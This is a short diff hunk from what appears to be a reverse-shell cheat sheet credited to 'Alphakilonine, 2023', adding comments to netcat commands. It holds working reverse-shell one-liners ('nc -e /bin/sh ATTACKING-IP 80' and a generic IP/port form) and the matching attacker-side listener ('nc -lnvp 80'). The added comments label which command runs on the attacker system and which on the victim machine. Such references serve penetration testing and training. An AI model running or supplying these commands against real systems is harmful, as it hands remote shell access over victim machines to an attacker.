@@ -32,7 +32,10 @@ Reverse Shells.  Alphakilonine, 2023
 #Linux
 nc <ip-address> <port> -e /bin/sh
 
+#listener stars on attacker system
 nc -lnvp 80
+
+#reverse shell starts on victim machine
 nc -e /bin/sh ATTACKING-IP 80
 
 #useful syntax
